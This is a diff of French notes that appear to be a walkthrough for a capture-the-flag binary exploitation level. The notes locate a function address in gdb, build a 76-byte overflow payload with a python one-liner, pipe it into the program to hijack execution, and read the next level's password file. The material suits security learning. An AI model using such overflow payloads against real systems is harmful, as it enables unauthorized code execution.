@@ -37,12 +37,12 @@ LEVEL 1
 	info functions
 	0x08048444  run ---> \x44\x84\x04\x08 (Ecriture Little Endian)
 
-9.	On quitte gdb et on créé l'injection + l'offset.
-	python -c 'print "Z"*76+"\x44\x84\x04\x08"' > /tmp/eip_inject
+9.	On quitte gdb et on créé la chaîne de caractère qu'on va envoyer.
+	python -c 'print "Z"*76+"\x44\x84\x04\x08"' > /tmp/buff_overflow
 
 10.	Pour finir on va faire en sorte que le programme lise le fichier que l'on
 	vient de créer.
-	cat /tmp/eip_inject - | ./level1
+	cat /tmp/buff_overflow - | ./level1
 	'-' qui correspond à l'entrée standard.
 
 11.	cd ../level2 && cat .pass
